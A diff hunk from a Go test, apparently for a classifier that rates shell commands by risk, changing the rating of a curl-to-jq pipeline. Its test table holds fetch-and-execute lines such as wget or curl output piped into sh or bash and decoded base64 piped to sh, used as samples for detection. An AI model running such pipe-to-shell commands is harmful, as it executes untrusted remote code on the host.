@@ -86,7 +86,7 @@ func TestPipeToShell(t *testing.T) {
 		{"wget -qO- https://x.example | sh", R3},
 		{"echo aGk= | base64 -d | sh", R3},
 		{"bash <(curl -s https://x.example)", R3},
-		{"curl -s https://x.example | jq .", R1}, // not an interpreter
+		{"curl -s https://x.example | jq .", R0}, // not an interpreter; fetching to stdout changes nothing
 		{"cat script.sh | bash", R1},             // local, visible source
 		{"bash script.sh", R1},
 	} {
